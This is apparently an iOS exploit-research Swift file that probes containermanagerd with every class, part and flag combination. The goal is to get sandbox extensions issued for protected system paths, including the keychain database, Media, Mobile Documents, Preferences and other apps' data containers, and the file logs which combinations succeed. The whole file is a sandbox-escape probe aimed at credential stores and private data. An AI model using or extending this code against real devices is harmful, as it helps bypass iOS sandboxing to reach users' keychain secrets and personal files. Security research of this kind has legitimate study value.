//
//  GrantMatrix.swift
//  Erosion
//
//  试探 containermanagerd：class(0-15) × part(0-8) × flags 组合，
//  看有没有哪种组合能给系统路径（Keychain / Media / Mobile Documents）签发沙盒扩展。
//  结果写 Documents/grant-matrix-result.json
//

import Foundation

enum GrantMatrix {
    static let targets = [
        "/private/var/Keychains/keychain-2.db",
        "/private/var/Keychains",
        "/private/var/mobile/Library/Mobile Documents",
        "/private/var/mobile/Media",
        "/private/var/mobile/Library/Preferences",
        "/private/var/mobile/Containers/Data/Application"
    ]

    static func run(group: String) {
        var results: [[String: Any]] = []

        for target in targets {
            var hit: [[String: Any]] = []
            for queryClass in 0...15 {
                for part in 0...8 {
                    for alt in [false, true] {
                        let handle = worse_query_ex(target, group, alt, false, UInt64(queryClass), UInt64(part))
                        if handle >= 0 {
                            hit.append([
                                "class": queryClass,
                                "part": part,
                                "alt": alt,
                                "handle": handle
                            ])
                            worse_query_release(handle)
                        }
                    }
                }
            }
            results.append([
                "target": target,
                "granted": hit
            ])
            print("(grant-matrix) \(target) -> \(hit.count) 个组合成功")
        }

        let payload: [String: Any] = [
            "at": ISO8601DateFormatter().string(from: Date()),
            "results": results
        ]
        let url = URL.documentsDirectory.appendingPathComponent("grant-matrix-result.json")
        if let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: url)
        }
        print("(grant-matrix) 完成，结果写入 grant-matrix-result.json")
    }
}
